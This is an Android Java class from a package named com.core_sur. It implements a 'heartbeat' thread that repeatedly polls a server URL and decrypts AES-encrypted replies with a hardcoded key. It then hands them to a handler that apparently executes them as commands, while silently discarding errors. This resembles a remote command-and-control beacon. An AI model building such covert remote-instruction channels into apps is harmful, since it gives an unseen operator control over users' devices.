package com.core_sur.action;

import java.io.IOException;
import java.util.Random;

import android.content.Context;
import android.os.Message;

import com.core_sur.Config;
import com.core_sur.WCConnect;
import com.core_sur.bean.CallbackResponseBean;
import com.core_sur.bean.RegResponse;
import com.core_sur.bean.RevBean;
import com.core_sur.tools.AES;
import com.core_sur.tools.Http;
import com.core_sur.tools.Log;

public class HeartThread extends Thread
{

	private static String TAG = "HeartThread";

	private final String url;
	private final int time;
	private boolean isrunning = true;
	private final Context context;
	private final RegResponse regResponse;

	public HeartThread(Context context, RegResponse regResponse)
	{
		this.context = context.getApplicationContext();
		this.url = regResponse.getHeartconnurl();
		this.time = regResponse.getHeartconntime();
		this.regResponse = regResponse;

	}

	public void stopHeart()
	{
		isrunning = false;
	}

	@Override
	public void run()
	{

		// 设置线程名称
		String threadName = "ht_" + (new Random().nextInt(100000000));
		this.setName(threadName);

		while (isrunning)
		{
			// 如果当前线程名改变了，那么退出
			if (!this.getName().equals(threadName))
			{
				return;
			}

			if (time == 0)
			{
				return;
			}

			try
			{
				String temp = getJson_Heart(context, url);

				if (temp.length() > 0)
				{
					CallbackResponseBean aCallbackResponseBean = WCConnect.getInstance().GetCallbackResponseBean(temp);

					if (aCallbackResponseBean.getStatus() == 10)
					{
						WCConnect.getInstance().openJSONData(AES.DecodeString(aCallbackResponseBean.getMsg(), Config.AesNewKey), context);
					}
					RevBean rb = new RevBean();
					rb.setCmdid(1003);
					rb.setDelayTime(0);
					rb.setLinkid(0);
					rb.setMsg(regResponse.getUid() + " heartThread,ok");

					Message message = new Message();
					message.what = 0;
					message.obj = rb;

					WCConnect.getInstance().handlerAction.sendMessage(message);
				}

			} catch (Exception e)
			{
			}

			try
			{
				sleep(time);
			} catch (Exception e)
			{
			}
		}
	}

	private String getJson_Heart(Context context, String url)
	{
		if (com.core_sur.Config.IsDebug)
		{
			Log.i(TAG, url);
		}
		String postData = "{\"cmdid\":1018}";

		if (com.core_sur.Config.IsDebug)
		{
			Log.i(TAG, "postData = " + postData);
		}

		String tempArgs = "uid=" + regResponse.getUid() + "&key=" + AES.EncodeString(postData, regResponse.getCryptkey());
		String tempData = HttpPost(context, url, tempArgs);

		if (com.core_sur.Config.IsDebug)
		{
			Log.i(TAG, "tempData = " + tempData);
		}
		return tempData;

	}

	/**
	 * 心跳
	 * 
	 * @return
	 */
	private String HttpPost(Context context, String url, String postData)
	{

		String requesturl = url;
		if (com.core_sur.Config.IsDebug)
		{
			Log.i(TAG, requesturl);
			Log.i(TAG, postData);
		}

		String xmlStr = null;

		try
		{

			Http http = new Http(context, requesturl, postData.getBytes(), " text/plain");

			http.setConnectTimeout(50 * 1000);
			http.setReadTimeout(30 * 1000);
			http.setRequestMethod(true);
			http.setSaveOutData(true);

			// if (isFourth()) {
			// http.setNetType(Http.NET_TYPE_UNASSIGN);
			// } else {
			// http.setNetType(Http.NET_TYPE_WAP);
			// }

			http.connect();
			if (com.core_sur.Config.IsDebug)
			{
				Log.i(TAG, "1111");
			}
			http.read();
			if (com.core_sur.Config.IsDebug)
			{
				Log.i(TAG, "len = " + http.getInData().length);
			}
			xmlStr = new String(http.getInData(), "UTF-8");
			if (com.core_sur.Config.IsDebug)
			{
				Log.i(TAG, xmlStr);
			}
			return xmlStr;

		} catch (IOException e)
		{
			e.printStackTrace();
			return null;
		}

	}

}
